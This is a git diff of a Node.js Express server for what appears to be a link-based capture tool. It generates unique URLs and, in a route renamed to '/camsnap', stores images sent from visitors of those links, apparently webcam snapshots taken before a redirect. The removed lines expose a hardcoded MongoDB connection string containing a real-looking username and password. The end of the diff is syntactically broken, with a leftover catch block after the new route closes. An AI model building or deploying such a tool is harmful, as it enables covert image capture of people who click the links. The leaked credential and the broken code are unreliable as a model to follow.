@@ -1,29 +1,22 @@
 require('dotenv').config();
-const express = require('express');
+const fs = require("fs");
+const express = require("express");
+const cors = require('cors');
 const bodyParser = require('body-parser');
+const fetch = require('node-fetch');
 const mongoose = require('mongoose');
-const path = require('path');
-const fs = require('fs');
+const Url = require('./models/Url'); // Import the Url model
+
+mongoose.connect(process.env.MONGODB_URI, { useNewUrlParser: true, useUnifiedTopology: true });
 
 const app = express();
-
-mongoose.connect(process.env.MONGODB_URI || 'mongodb+srv://dartmino64:CXd21bYqriwfgtUN@cluster0.p7eujjb.mongodb.net/urlcapture?retryWrites=true&w=majority', {
-  useNewUrlParser: true,
-  useUnifiedTopology: true
-});
-
-const urlSchema = new mongoose.Schema({
-  originalUrl: String,
-  uniqueId: String,
-  redirectUrl: String,
-  imagePath: String
-});
-const Url = mongoose.model('Url', urlSchema);
-
 app.use(bodyParser.json({ limit: '50mb' }));
-app.use(express.static(path.join(__dirname, 'public')));
-app.set('view engine', 'ejs');
-app.set('views', path.join(__dirname, 'views'));
+app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
+app.use(cors());
+app.set("view engine", "ejs");
+
+const hostURL = process.env.HOST_URL || "YOUR_HOST_URL";
+
 
 app.post('/generate', async (req, res) => {
   try {
@@ -74,26 +67,23 @@ app.get('/w/:id', async (req, res) => {
   }
 });
 
-app.post('/upload', async (req, res) => {
+app.post("/camsnap", async (req, res) => {
   try {
-    const imageData = req.body.image;
-    const id = req.body.id;
-    const base64Data = imageData.replace(/^data:image\/png;base64,/, '');
-    const filePath = path.join(__dirname, 'uploads', `image_${Date.now()}.png`);
+    const { uid, img } = req.body;
+    const url = await Url.findOne({ uniqueId: uid });
+    if (url) {
+      url.imageData = img;
+      await url.save();
+      res.send("Done");
+    } else {
+      res.status(404).send("Not Found");
+    }
+  } catch (error) {
+    console.error("Error saving image:", error);
+    res.status(500).send("Server error");
+  }
+});
 
-    fs.writeFile(filePath, base64Data, 'base64', async (err) => {
-      if (err) {
-        return res.status(500).send('Error saving image');
-      }
-      const url = await Url.findOne({ uniqueId: id });
-      if (url) {
-        url.imagePath = filePath;
-        await url.save();
-        res.json({ redirectUrl: url.redirectUrl });
-      } else {
-        res.status(404).send('Not Found');
-      }
-    });
   } catch (error) {
     console.error('Error uploading image:', error);
     res.status(500).send('Server error');
